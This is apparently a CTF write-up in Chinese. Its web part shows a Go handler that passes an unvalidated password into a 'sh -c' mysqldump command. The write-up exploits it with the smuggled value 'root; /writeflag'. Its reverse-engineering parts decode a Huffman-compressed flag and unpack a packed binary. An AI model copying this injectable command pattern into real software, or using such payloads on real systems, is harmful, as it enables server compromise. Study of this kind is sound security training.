<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ImportData</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> config ImportConfig</span><br><span class="line">	<span class="keyword">if</span> err := c.ShouldBindJSON(&amp;config); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		c.JSON(http.StatusBadRequest, gin.H&#123;</span><br><span class="line">			<span class="string">&quot;success&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">			<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Invalid request body: &quot;</span> + err.Error(),</span><br><span class="line">		&#125;)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> err := validateImportConfig(config); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		c.JSON(http.StatusBadRequest, gin.H&#123;</span><br><span class="line">			<span class="string">&quot;success&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">			<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Invalid input: &quot;</span> + err.Error(),</span><br><span class="line">		&#125;)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	config.RemoteHost = sanitizeInput(config.RemoteHost)</span><br><span class="line">	config.RemoteUsername = sanitizeInput(config.RemoteUsername)</span><br><span class="line">	config.RemoteDatabase = sanitizeInput(config.RemoteDatabase)</span><br><span class="line">	config.LocalDatabase = sanitizeInput(config.LocalDatabase)</span><br><span class="line">	<span class="keyword">if</span> manager.db == <span class="literal">nil</span> &#123;</span><br><span class="line">		dsn := buildDSN(localConfig)</span><br><span class="line">		db, err := sql.Open(<span class="string">&quot;mysql&quot;</span>, dsn)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			c.JSON(http.StatusInternalServerError, gin.H&#123;</span><br><span class="line">				<span class="string">&quot;success&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">				<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Failed to connect to local database: &quot;</span> + err.Error(),</span><br><span class="line">			&#125;)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> err := db.Ping(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">			db.Close()</span><br><span class="line">			c.JSON(http.StatusInternalServerError, gin.H&#123;</span><br><span class="line">				<span class="string">&quot;success&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">				<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Failed to ping local database: &quot;</span> + err.Error(),</span><br><span class="line">			&#125;)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		manager.db = db</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> err := createdb(config.LocalDatabase); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		c.JSON(http.StatusInternalServerError, gin.H&#123;</span><br><span class="line">			<span class="string">&quot;success&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">			<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Failed to create local database: &quot;</span> + err.Error(),</span><br><span class="line">		&#125;)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//Never able to inject shell commands,Hackers can&#x27;t use this,HaHa</span></span><br><span class="line">	command := fmt.Sprintf(<span class="string">&quot;/usr/local/bin/mysqldump -h %s -u %s -p%s %s |/usr/local/bin/mysql -h 127.0.0.1 -u %s -p%s %s&quot;</span>,</span><br><span class="line">		config.RemoteHost,</span><br><span class="line">		config.RemoteUsername,</span><br><span class="line">		config.RemotePassword,</span><br><span class="line">		config.RemoteDatabase,</span><br><span class="line">		localConfig.Username,</span><br><span class="line">		localConfig.Password,</span><br><span class="line">		config.LocalDatabase,</span><br><span class="line">	)</span><br><span class="line">	fmt.Println(command)</span><br><span class="line">	cmd := exec.Command(<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, command)</span><br><span class="line">	<span class="keyword">if</span> err := cmd.Run(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		c.JSON(http.StatusInternalServerError, gin.H&#123;</span><br><span class="line">			<span class="string">&quot;success&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">			<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Failed to import data: &quot;</span> + err.Error(),</span><br><span class="line">		&#125;)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">		<span class="string">&quot;success&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">		<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Data imported successfully&quot;</span>,</span><br><span class="line">	&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">validateImportConfig</span><span class="params">(config ImportConfig)</span></span> <span class="type">error</span> &#123;</span><br><span class="line">	<span class="keyword">if</span> config.RemoteHost == <span class="string">&quot;&quot;</span> ||</span><br><span class="line">		config.RemoteUsername == <span class="string">&quot;&quot;</span> ||</span><br><span class="line">		config.RemoteDatabase == <span class="string">&quot;&quot;</span> ||</span><br><span class="line">		config.LocalDatabase == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;missing required fields&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> match, _ := regexp.MatchString(<span class="string">`^[a-zA-Z0-9\.\-]+$`</span>, config.RemoteHost); !match &#123;</span><br><span class="line">		<span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;invalid remote host&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> match, _ := regexp.MatchString(<span class="string">`^[a-zA-Z0-9_]+$`</span>, config.RemoteUsername); !match &#123;</span><br><span class="line">		<span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;invalid remote username&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> match, _ := regexp.MatchString(<span class="string">`^[a-zA-Z0-9_]+$`</span>, config.RemoteDatabase); !match &#123;</span><br><span class="line">		<span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;invalid remote database name&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> match, _ := regexp.MatchString(<span class="string">`^[a-zA-Z0-9_]+$`</span>, config.LocalDatabase); !match &#123;</span><br><span class="line">		<span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;invalid local database name&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250224120756891.png" alt="image-20250224120756891"></p>
<p>填入密码时：root; &#x2F;writeflag即可</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250224121747053.png" alt="image-20250224121747053"></p>
<p>然后访问&#x2F;flag即可</p>
<h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="Compress-dot-new"><a href="#Compress-dot-new" class="headerlink" title="Compress dot new"></a>Compress dot new</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250204111816803.png" alt="image-20250204111816803"></p>
<p>Compress.nu中有Nushell代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def &quot;into b&quot; [] &#123;</span><br><span class="line">let arg = $in;</span><br><span class="line">	0..(( $arg|length ) - 1) | each &#123;|i| $arg | bytes at $i..$i | into int &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个函数的作用是将输入转换为字节数组的整数形式。例如，如果输入是二进制数据，每个字节会被转换为0-255的整数，并生成一个列表。比如字符串”abc”会被转换为[97,98,99]。</p>
<p>接下来是gss和gw这两个函数，gss函数匹配输入的结构，如果是{s:s, w:w}则返回[s]，如果是{a:a, b:b, ss:ss, w:w}则返回ss。gw函数则是提取w字段。这可能是在构建哈夫曼树的过程中使用的，因为哈夫曼树的节点通常会有权重（w），而内部节点有左右子树，叶子节点有符号和权重。</p>
<p>接下来是oi函数，这是一个插入排序或者维护优先队列的函数？参数是v，输入是一个列表。如果列表为空，返回[v]；否则，如果当前元素的权重小于头部的权重，就插入到前面，否则递归处理尾部。这可能用于维护一个优先队列，按权重从小到大排序，用于构建哈夫曼树。</p>
<p>h函数看起来是构建哈夫曼树的函数。它处理输入的列表，如果是空则返回空，如果只有一个节点则返回该节点，否则取出前两个节点（假设输入是按权重排序的），合并成一个内部节点，权重是两者的和，然后递归处理。这符合哈夫曼树的构建过程：每次取出两个最小的权重节点，合并成一个新节点，然后重新插入队列，直到只剩一个节点。</p>
<p>gc函数可能用于生成哈夫曼编码表。它定义了一个内部函数t，递归遍历哈夫曼树，并为每个叶子节点生成对应的二进制编码（0和1的字符串）。例如，左子树路径添加0，右子树添加1。最终返回每个符号s对应的编码cs。</p>
<p>sk函数可能是将哈夫曼树的结构序列化为JSON，以便在解压时重建<strong>哈夫曼</strong>树。</p>
<p>bf函数的作用是统计输入字节的频率。它先将输入转换为字节数组，然后统计每个字节出现的次数，返回一个包含{s: 字节值, w: 出现次数}的列表。这明显是哈夫曼编码前的频率统计步骤。</p>
<p>enc函数接受编码表cd，将输入转换为对应的二进制字符串。对于每个字节b，查找编码表中对应的cs，然后拼接所有二进制字符串，得到压缩后的比特流。</p>
<p>compress函数则是整个压缩流程：首先调用bf统计频率，然后构建哈夫曼树h，接着生成编码表gc，然后将输入数据用enc函数编码，并将树的结构和编码后的字符串拼接保存。</p>
<p><strong>enc.txt</strong>：</p>
<p>enc.txt的内容分为两部分，第一部分是JSON结构，第二部分是二进制字符串。根据compress函数中的代码，输出的第一部分是($t | sk | to json –raw)，也就是哈夫曼树的简化结构，第二部分是编码后的二进制字符串。所以enc.txt中的JSON部分对应哈夫曼树的结构，后面的长二进制字符串是压缩后的数据。</p>
<p>sk函数：当处理节点时，如果是叶子节点，就保留s属性；如果是内部节点，则递归处理a和b。(<strong>缺少权重信息</strong>)</p>
<blockquote>
<p>如，JSON结构中的某个路径是a.a.a.a.a对应符号125，编码可能是00000。</p>
</blockquote>
<p><strong>分析</strong></p>
<ol>
<li><p><strong>解析哈夫曼树结构</strong></p>
<p>enc.txt中的JSON部分描述了哈夫曼树的节点结构。每个内部节点包含<code>a</code>和<code>b</code>子节点，叶子节点包含<code>s</code>（符号）字段。遍历该结构，生成每个符号对应的哈夫曼编码。</p>
</li>
<li><p><strong>构建哈夫曼编码表</strong>：递归遍历JSON树，记录每个符号的路径（<code>a</code>对应0，<code>b</code>对应1），生成符号到二进制编码的映射。</p>
</li>
<li><p><strong>解码二进制字符串</strong>：使用编码表将enc.txt中的二进制字符串逐位匹配，转换为原始字节数据，最终得到flag。</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_huffman_codes</span>(<span class="params">node, current_code, codes</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;s&#x27;</span> <span class="keyword">in</span> node:</span><br><span class="line">        codes[node[<span class="string">&#x27;s&#x27;</span>]] = current_code</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;a&#x27;</span> <span class="keyword">in</span> node:</span><br><span class="line">        build_huffman_codes(node[<span class="string">&#x27;a&#x27;</span>], current_code + <span class="string">&#x27;0&#x27;</span>, codes)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;b&#x27;</span> <span class="keyword">in</span> node:</span><br><span class="line">        build_huffman_codes(node[<span class="string">&#x27;b&#x27;</span>], current_code + <span class="string">&#x27;1&#x27;</span>, codes)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取enc.txt并分离JSON和二进制部分</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;enc.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    content = f.read().split(<span class="string">&#x27;\n&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">    json_part = content[<span class="number">0</span>]</span><br><span class="line">    binary_str = content[<span class="number">1</span>].strip()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析JSON结构</span></span><br><span class="line">json_data = json.loads(json_part)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建哈夫曼编码表</span></span><br><span class="line">huffman_codes = &#123;&#125;</span><br><span class="line">build_huffman_codes(json_data[<span class="string">&#x27;a&#x27;</span>], <span class="string">&#x27;0&#x27;</span>, huffman_codes)</span><br><span class="line">build_huffman_codes(json_data[<span class="string">&#x27;b&#x27;</span>], <span class="string">&#x27;1&#x27;</span>, huffman_codes)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建解码映射（编码到符号）</span></span><br><span class="line">reverse_codes = &#123;v: k <span class="keyword">for</span> k, v <span class="keyword">in</span> huffman_codes.items()&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解码二进制字符串</span></span><br><span class="line">decoded = []</span><br><span class="line">current_code = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> binary_str:</span><br><span class="line">    current_code += bit</span><br><span class="line">    <span class="keyword">if</span> current_code <span class="keyword">in</span> reverse_codes:</span><br><span class="line">        symbol = reverse_codes[current_code]</span><br><span class="line">        decoded.append(<span class="built_in">int</span>(symbol))</span><br><span class="line">        current_code = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换解码后的符号为ASCII字符串</span></span><br><span class="line">flag_bytes = <span class="built_in">bytes</span>(decoded)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Flag:&quot;</span>, flag_bytes.decode(<span class="string">&#x27;ascii&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250204113410555.png" alt="image-20250204113410555"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250204113432829.png" alt="image-20250204113432829"></p>
<blockquote>
<p>中间输出这些中间变量就能懂了</p>
</blockquote>
<h3 id="Turtle"><a href="#Turtle" class="headerlink" title="Turtle"></a>Turtle</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250204113540806.png" alt="image-20250204113540806"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250204113830385.png" alt="image-20250204113830385"></p>
<p>看来得手动脱壳</p>
<blockquote>
<p>看别人的wp发现了<a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-867990-1-1.html">XVolkolak 0.22 静态脱壳神器汉化版 - 吾爱破解 - 52pojie.cn</a></p>
<p>这个工具，可以直接脱</p>
</blockquote>
<p>F9到这再F8一下发现RSP变化</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250204120842116.png" alt="image-20250204120842116"></p>
<p>右键RSP跟随，下面面板下硬件断点</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250204121108775.png" alt="image-20250204121108775"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250204121245984.png" alt="image-20250204121245984"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">256</span>]; <span class="comment">// [rsp+20h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">48</span>]; <span class="comment">// [rsp+120h] [rbp+A0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">46</span>]; <span class="comment">// [rsp+150h] [rbp+D0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">5</span>]; <span class="comment">// [rsp+17Eh] [rbp+FEh] BYREF</span></span><br><span class="line">  <span class="type">char</span> v8[<span class="number">2</span>]; <span class="comment">// [rsp+183h] [rbp+103h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v9[<span class="number">8</span>]; <span class="comment">// [rsp+185h] [rbp+105h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v10[<span class="number">8</span>]; <span class="comment">// [rsp+18Dh] [rbp+10Dh] BYREF</span></span><br><span class="line">  <span class="type">char</span> v11[<span class="number">11</span>]; <span class="comment">// [rsp+195h] [rbp+115h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v12; <span class="comment">// [rsp+1A0h] [rbp+120h]</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [rsp+1A4h] [rbp+124h]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [rsp+1A8h] [rbp+128h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v15; <span class="comment">// [rsp+1ACh] [rbp+12Ch]</span></span><br><span class="line"></span><br><span class="line">  sub_401C20(argc, argv, envp);</span><br><span class="line">  <span class="built_in">strcpy</span>(v11, <span class="string">&quot;yekyek&quot;</span>);</span><br><span class="line">  v7[<span class="number">0</span>] = <span class="number">-51</span>;</span><br><span class="line">  v7[<span class="number">1</span>] = <span class="number">-113</span>;</span><br><span class="line">  v7[<span class="number">2</span>] = <span class="number">37</span>;</span><br><span class="line">  v7[<span class="number">3</span>] = <span class="number">61</span>;</span><br><span class="line">  v7[<span class="number">4</span>] = <span class="number">-31</span>;</span><br><span class="line">  qmemcpy(v8, <span class="string">&quot;QJ&quot;</span>, <span class="keyword">sizeof</span>(v8));</span><br><span class="line">  v5[<span class="number">0</span>] = <span class="number">-8</span>;</span><br><span class="line">  v5[<span class="number">1</span>] = <span class="number">-43</span>;</span><br><span class="line">  v5[<span class="number">2</span>] = <span class="number">98</span>;</span><br><span class="line">  v5[<span class="number">3</span>] = <span class="number">-49</span>;</span><br><span class="line">  v5[<span class="number">4</span>] = <span class="number">67</span>;</span><br><span class="line">  v5[<span class="number">5</span>] = <span class="number">-70</span>;</span><br><span class="line">  v5[<span class="number">6</span>] = <span class="number">-62</span>;</span><br><span class="line">  v5[<span class="number">7</span>] = <span class="number">35</span>;</span><br><span class="line">  v5[<span class="number">8</span>] = <span class="number">21</span>;</span><br><span class="line">  v5[<span class="number">9</span>] = <span class="number">74</span>;</span><br><span class="line">  v5[<span class="number">10</span>] = <span class="number">81</span>;</span><br><span class="line">  v5[<span class="number">11</span>] = <span class="number">16</span>;</span><br><span class="line">  v5[<span class="number">12</span>] = <span class="number">39</span>;</span><br><span class="line">  v5[<span class="number">13</span>] = <span class="number">16</span>;</span><br><span class="line">  v5[<span class="number">14</span>] = <span class="number">-79</span>;</span><br><span class="line">  v5[<span class="number">15</span>] = <span class="number">-49</span>;</span><br><span class="line">  v5[<span class="number">16</span>] = <span class="number">-60</span>;</span><br><span class="line">  v5[<span class="number">17</span>] = <span class="number">9</span>;</span><br><span class="line">  v5[<span class="number">18</span>] = <span class="number">-2</span>;</span><br><span class="line">  v5[<span class="number">19</span>] = <span class="number">-29</span>;</span><br><span class="line">  v5[<span class="number">20</span>] = <span class="number">-97</span>;</span><br><span class="line">  v5[<span class="number">21</span>] = <span class="number">73</span>;</span><br><span class="line">  v5[<span class="number">22</span>] = <span class="number">-121</span>;</span><br><span class="line">  v5[<span class="number">23</span>] = <span class="number">-22</span>;</span><br><span class="line">  v5[<span class="number">24</span>] = <span class="number">89</span>;</span><br><span class="line">  v5[<span class="number">25</span>] = <span class="number">-62</span>;</span><br><span class="line">  v5[<span class="number">26</span>] = <span class="number">7</span>;</span><br><span class="line">  v5[<span class="number">27</span>] = <span class="number">59</span>;</span><br><span class="line">  v5[<span class="number">28</span>] = <span class="number">-87</span>;</span><br><span class="line">  v5[<span class="number">29</span>] = <span class="number">17</span>;</span><br><span class="line">  v5[<span class="number">30</span>] = <span class="number">-63</span>;</span><br><span class="line">  v5[<span class="number">31</span>] = <span class="number">-68</span>;</span><br><span class="line">  v5[<span class="number">32</span>] = <span class="number">-3</span>;</span><br><span class="line">  v5[<span class="number">33</span>] = <span class="number">75</span>;</span><br><span class="line">  v5[<span class="number">34</span>] = <span class="number">87</span>;</span><br><span class="line">  v5[<span class="number">35</span>] = <span class="number">-60</span>;</span><br><span class="line">  v5[<span class="number">36</span>] = <span class="number">126</span>;</span><br><span class="line">  v5[<span class="number">37</span>] = <span class="number">-48</span>;</span><br><span class="line">  v5[<span class="number">38</span>] = <span class="number">-86</span>;</span><br><span class="line">  v5[<span class="number">39</span>] = <span class="number">10</span>;</span><br><span class="line">  v15 = <span class="number">6</span>;</span><br><span class="line">  v14 = <span class="number">7</span>;</span><br><span class="line">  v13 = <span class="number">40</span>;</span><br><span class="line">  sub_403068(aPlzInputTheKey);</span><br><span class="line">  sub_403058(<span class="string">&quot;%s&quot;</span>, v9);</span><br><span class="line">  sub_403048(v10, v9);</span><br><span class="line">  v12 = <span class="number">7</span>;</span><br><span class="line">  sub_401550(v11, v15, v4);</span><br><span class="line">  sub_40163E(v9, v12, v4);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)sub_403078(v9, v7, v14) ) &#123;</span><br><span class="line">    sub_403060(aKeyIsWrong);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    sub_403068(aPlzInputTheFla);</span><br><span class="line">    sub_403058(<span class="string">&quot;%s&quot;</span>, v6);</span><br><span class="line">    *(_DWORD *)&amp;v11[<span class="number">7</span>] = <span class="number">40</span>;</span><br><span class="line">    sub_401550(v10, v12, v4);</span><br><span class="line">    sub_40175A(v6, *(<span class="type">unsigned</span> <span class="type">int</span> *)&amp;v11[<span class="number">7</span>], v4);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)sub_403078(v6, v5, v13) )</span><br><span class="line">      sub_403060(aWrongPlzTryAga);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      sub_403060(aCongratulate);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

